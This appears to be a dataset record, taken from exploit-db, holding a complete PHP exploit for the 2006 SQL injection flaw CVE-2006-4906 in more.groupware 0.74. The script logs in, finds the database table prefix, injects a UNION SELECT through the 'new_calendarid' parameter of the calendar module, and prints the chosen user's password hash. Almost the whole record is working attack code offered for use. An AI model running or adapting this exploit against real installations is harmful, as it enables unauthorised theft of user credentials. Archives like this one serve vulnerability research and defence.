{
  "id": "2394",
  "title": "more.groupware 0.74 - &#039;new_calendarid&#039; SQL Injection",
  "cve": "CVE-2006-4906",
  "vuln_type": "sqli",
  "code": "<?\r\nerror_reporting(E_ERROR);\r\n\r\nfunction exploit_init()\r\n{\r\n    if (!extension_loaded('php_curl') && !extension_loaded('curl'))\r\n    {\r\n       if (!dl('curl.so') && !dl('php_curl.dll'))\r\n       die (\"oo error - cannot load curl extension!\");\r\n    }\r\n}\r\n\r\nfunction exploit_header()\r\n{\r\n    echo \"\\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo\";\r\n    echo \"                                  oo    ooooooo     ooooooo\\n\";\r\n    echo \"                    oooo   oooo o888  o88     888 o888   888o\\n\";\r\n    echo \"                      888o888    888        o888   888888888\\n\";\r\n    echo \"                      o88888o    888     o888   o 888o   o888\\n\";\r\n    echo \"                    o88o   o88o o888o o8888oooo88   88ooo88\\n\";\r\n    echo \"ooooooooooooooooooo more.groupware 0.7.4 remote sql injection oooooooooooooooooo\\n\";\r\n    echo \"oo usage          $ php mg-074-exploit.php [url] [user] [pwd] [id]\\n\";\r\n    echo \"oo proxy support  $ php mg-074-exploit.php [url] [user] [pwd] [id]\\n\";\r\n    echo \"                  [proxy]:[port]\\n\";\r\n    echo \"oo example        $ php mg-074-exploit.php http://localhost x128 pwd 1\\n\";\r\n    echo \"oo you need an account on the system\\n\";\r\n    echo \"oo print the password of the user\\n\\n\";\r\n}\r\n\r\nfunction exploit_bottom()\r\n{\r\n    echo \"\\noo message  : sanja - es tut mir sehr leid, was ich zu dir gesagt habe. ich war\\n\";\r\n    echo \"              nicht ich selbst. ich hoffe, dass du diesen exploit als wiedergut-\";\r\n    echo \"              machung verstehst. ich haette dich zwar lieber zum eisessen\\n\"; \r\n    echo \"              eingeladen, aber ich traue mich nicht mehr dich zu fragen ;).\\n\";\r\n    echo \"oo discover : x128 - alexander wilhelm - 17/09/2006\\n\";\r\n    echo \"oo contact  : exploit <at> x128.net                    oo website : www.x128.net\\n\";\r\n}\r\n\r\nfunction exploit_execute()\r\n{\r\n    $connection = curl_init();\r\n\r\n    if ($_SERVER['argv'][5])\r\n    {\r\n        curl_setopt($connection, CURLOPT_TIMEOUT, 8);\r\n        curl_setopt($connection, CURLOPT_PROXY, $_SERVER['argv'][5]);\r\n    }\r\n    curl_setopt ($connection, CURLOPT_USERAGENT, 'x128');\r\n    curl_setopt ($connection, CURLOPT_RETURNTRANSFER, 1);\r\n    curl_setopt ($connection, CURLOPT_HEADER, 0);\r\n    curl_setopt ($connection, CURLOPT_POST, 1);\r\n    curl_setopt ($connection, CURLOPT_COOKIE, 1);\r\n    curl_setopt ($connection, CURLOPT_COOKIEJAR, 'exp-cookie.txt');\r\n    curl_setopt ($connection, CURLOPT_COOKIEFILE, 'exp-cookie.txt');\r\n    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . \"/index.php\");\r\n    curl_setopt ($connection, CURLOPT_POSTFIELDS, \"login=\" . $_SERVER['argv'][2] . \"&password=\" . $_SERVER['argv'][3] . \"&checkip=0\");\r\n    $source = curl_exec($connection) or die(\"oo error - cannot connect!\\n\");\r\n\r\n    curl_setopt ($connection, CURLOPT_POST, 1);\r\n    curl_setopt ($connection, CURLOPT_POSTFIELDS, \"new_calendarid=x128\");\r\n    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . \"/modules/calendar/week.php?\");\r\n    $source = curl_exec($connection) or die(\"oo error - cannot connect!\\n\");\r\n\r\n    preg_match(\"/([0-9a-zA-Z_]*)users/\", $source, $prefix);\r\n\r\n    curl_setopt ($connection, CURLOPT_POST, 1);\r\n    curl_setopt ($connection, CURLOPT_POSTFIELDS, \"new_calendarid=\" .urlencode(\"0 UNION SELECT id,pw FROM \" . $prefix[1] . \"users WHERE id = \" . $_SERVER['argv'][4]));\r\n    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . \"/modules/calendar/week.php\");\r\n    $source = curl_exec($connection) or die(\"oo error - cannot connect!\\n\");\r\n\r\n    preg_match(\"/>([0-9a-f]{32})</\", $source, $password);\r\n\r\n    if ($password[1])\r\n    {\r\n        echo \"oo password       \" . $password[1] . \"\\n\\n\";\r\n        echo \"oo dafaced ...\\n\";\r\n    }\r\n\r\n    curl_close ($connection);\r\n}\r\n\r\nexploit_init();\r\nexploit_header();\r\nexploit_execute();\r\nexploit_bottom();\r\n?>\r\n\r\n# milw0rm.com [2006-09-19]",
  "url": "https://www.exploit-db.com/exploits/2394"
}